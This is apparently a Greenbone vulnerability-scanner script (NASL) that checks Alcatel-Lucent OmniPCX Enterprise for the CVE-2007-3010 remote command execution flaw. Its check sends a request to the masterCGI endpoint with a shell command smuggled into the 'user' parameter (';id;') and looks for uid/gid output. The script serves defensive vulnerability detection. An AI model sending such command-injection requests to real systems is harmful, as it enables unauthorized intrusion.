if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103480" );
	script_bugtraq_id( 25694 );
	script_cve_id( "CVE-2007-3010" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "Alcatel-Lucent OmniPCX Enterprise Remote Command Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/25694" );
	script_xref( name: "URL", value: "http://www1.alcatel-lucent.com/enterprise/en/products/ip_telephony/omnipcxenterprise/index.html" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/479699" );
	script_xref( name: "URL", value: "http://www1.alcatel-lucent.com/psirt/statements/2007002/OXEUMT.htm" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-04-26 13:55:46 +0200 (Thu, 26 Apr 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "The vendor has released an advisory along with fixes to address this
issue. Please see the referenced advisory for information on
obtaining fixes." );
	script_tag( name: "summary", value: "Alcatel-Lucent OmniPCX Enterprise is prone to a remote command-
execution vulnerability because it fails to adequately sanitize user-
supplied data." );
	script_tag( name: "impact", value: "Attackers can exploit this issue to execute arbitrary commands with
the privileges of the 'httpd' user. Successful attacks may facilitate
a compromise of the application and underlying webserver, other
attacks are also possible." );
	script_tag( name: "affected", value: "Alcatel-Lucent OmniPCX Enterprise R7.1 and prior versions are
vulnerable to this issue." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
url = "/index.html";
buf = http_get_cache( port: port, item: url );
if(ContainsString( buf, "<title>OmniPCX" )){
	url = "/cgi-bin/masterCGI?ping=nomip&user=;id;";
	if( http_vuln_check( port: port, url: url, pattern: "uid=[0-9]+.*gid=[0-9]+.*", check_header: TRUE ) ){
		security_message( port: port );
		exit( 0 );
	}
	else {
		exit( 99 );
	}
}
exit( 0 );

